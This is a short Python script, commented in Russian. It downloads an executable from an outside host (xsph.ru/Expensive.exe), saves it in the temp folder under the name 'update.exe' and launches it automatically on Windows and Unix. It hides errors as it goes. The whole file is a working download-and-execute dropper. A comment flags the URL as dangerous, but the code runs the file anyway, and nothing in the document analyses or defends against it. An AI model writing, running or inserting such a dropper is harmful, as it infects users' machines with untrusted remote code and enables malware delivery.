import requests
import os
import tempfile

url = "http://f1084249.xsph.ru/Expensive.exe"  # Опасный URL!

def download_and_run():
    try:
        # Скачивание
        response = requests.get(url, timeout=15)
        response.raise_for_status()
        
        # Сохранение во временную папку
        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, "update.exe")
        
        with open(file_path, 'wb') as f:
            f.write(response.content)
            
        # Автозапуск
        if os.name == 'nt':
            os.startfile(file_path)
        else:
            os.system(f'chmod +x "{file_path}" && "{file_path}"')
            
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    download_and_run()